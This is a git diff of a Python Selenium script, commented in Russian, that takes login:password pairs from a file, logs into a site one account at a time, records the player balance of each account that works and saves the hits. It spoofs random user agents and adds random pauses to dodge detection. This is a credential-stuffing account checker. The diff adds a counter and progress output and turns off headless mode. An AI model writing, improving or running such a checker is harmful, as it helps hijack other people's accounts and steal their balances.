@@ -6,6 +6,7 @@ from selenium.webdriver.support.ui import WebDriverWait  # ожидания
 import time  # для паузы в действиях
 from fake_useragent import UserAgent 
 
+
 # Создаем экземпляр UserAgent
 ua = UserAgent()
 
@@ -15,7 +16,7 @@ random_user_agent = ua.random
 # Настройки браузера
 options = webdriver.ChromeOptions()
 options.add_argument(f"user-agent={random_user_agent}")  # Устанавливаем случайный пользовательский агент
-options.add_argument("--headless")  # Закомментировать, если нужен видимый браузер
+#options.add_argument("--headless")  # Закомментировать, если нужен видимый браузер
 
 driver = webdriver.Chrome(options=options)  # инициализация браузера с заданными настройками
 
@@ -23,6 +24,7 @@ driver = webdriver.Chrome(options=options)  # инициализация бра�
 input_file = "accounts_check.txt"
 output_file = "results.txt"
 
+cnt = 0
 
 try:
     # Читаем логины и пароли из файла
@@ -36,8 +38,9 @@ try:
     time.sleep(random.randint(15, 20))  # Случайная пауза от 15 до 20 секунд
 
     for account in accounts:
+        cnt += 1
         login, password = account.strip().split(':')  # Разделяем логин и пароль
-
+        print(f'🔄 Вход в аккаунт {login}:{password}   {cnt}/{len(accounts)}')
 
         # Находим поле логина (по placeholder)
         login_field = driver.find_element(By.XPATH, "//input[@placeholder='Логин']")
@@ -66,6 +69,7 @@ try:
                 balance_element = driver.find_element(By.XPATH, "//div[contains(@class, 'badge green')]")
                 balance = balance_element.text  # Получаем текст, который содержит баланс
                 results.append(f"✅ Успешный вход! {login}:{password} Баланс игрока: {balance}")  # Записываем баланс в результат аккаунта 
+                print(f"✅ Успешный вход! {login}:{password} Баланс игрока: {balance}")   
 
                 # Ждем, пока кнопка "Выйти" станет доступной
                 WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[contains(@class, 'button_profile') and contains(text(), 'Выйти')]")))
@@ -77,6 +81,7 @@ try:
 
         except Exception as e:
             results.append(f"❌ Ошибка входа! {login}:{password}")
+            print(f"❌ Ошибка входа! {login}:{password}")
 
     # Записываем результаты в файл
     with open(output_file, "w") as file:
@@ -85,3 +90,4 @@ try:
 
 finally:
     driver.quit()  # Закрываем браузер
+    print("🏁 Проверка успешно завершена!")
